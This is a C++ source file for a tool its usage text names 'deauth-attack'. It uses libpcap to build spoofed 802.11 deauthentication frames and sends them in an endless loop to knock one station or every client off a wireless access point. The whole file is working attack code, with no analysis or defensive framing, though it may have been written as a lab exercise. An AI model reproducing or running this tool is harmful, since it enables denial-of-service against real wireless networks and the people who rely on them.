#include <cstdio>
#include <iostream>
#include <pcap.h>
#include <libnet.h>
#include <utility>
#include <string>
#include <map>
#include <mac.h>
#define SUCCESS 0
#define FAIL -1
struct ieee80211_radiotap_header {
        u_int8_t        it_version;     /* set to 0 */
        u_int8_t        it_pad;
        u_int16_t       it_len;         /* entire length */
        u_int32_t       it_present;     /* fields present */
} __attribute__((__packed__));
#define MAC_SIZE 6
typedef struct BEACON {
    uint8_t type;
    uint8_t flag;
    uint16_t duration;
    Mac da;
    Mac sa;
    Mac bssid;
    uint16_t seq;
}__attribute__((__packed__)) beacon_hdr;
typedef struct fixed_parameter {
    uint16_t reason_code;
}fp;
typedef struct PACKET {
    ieee80211_radiotap_header radio;
    beacon_hdr beacon;
    fp reason;
}__attribute__((__packed__)) packet;
void usage(void)
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
    return;
}

int main(int argc, char* argv[])
{
    if (argc<3||argc>4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    packet packet;
    packet.radio.it_version=0;
    packet.radio.it_pad=0;
    packet.radio.it_len=8;
    packet.radio.it_present=0;
    packet.beacon.type=0xc0;
    packet.beacon.flag=0;
    packet.beacon.duration=0;
    packet.beacon.seq=0;
    packet.reason.reason_code=htons(0x700);
    if(argc==3) {
        packet.beacon.da=Mac("FF:FF:FF:FF:FF:FF");
        packet.beacon.sa=Mac(argv[2]);
        packet.beacon.bssid=Mac(argv[2]);
    }
    while(1) {
        if(argc==4) {
            packet.beacon.da=Mac(argv[3]);
            packet.beacon.sa=Mac(argv[2]);
            packet.beacon.bssid=Mac(argv[2]);
        }
        int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(packet));
        if(ret!=0) {
            printf("Failed to send packet! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
            return FAIL;
        }
        if(argc==4) {
            packet.beacon.da=Mac(argv[2]);
            packet.beacon.sa=Mac(argv[3]);
            packet.beacon.bssid=Mac(argv[3]);
            ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(packet));
            if(ret!=0) {
                printf("Failed to send packet! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
                return FAIL;
            }
        }
        sleep(1);
    }
    pcap_close(handle);
    return 0;
}
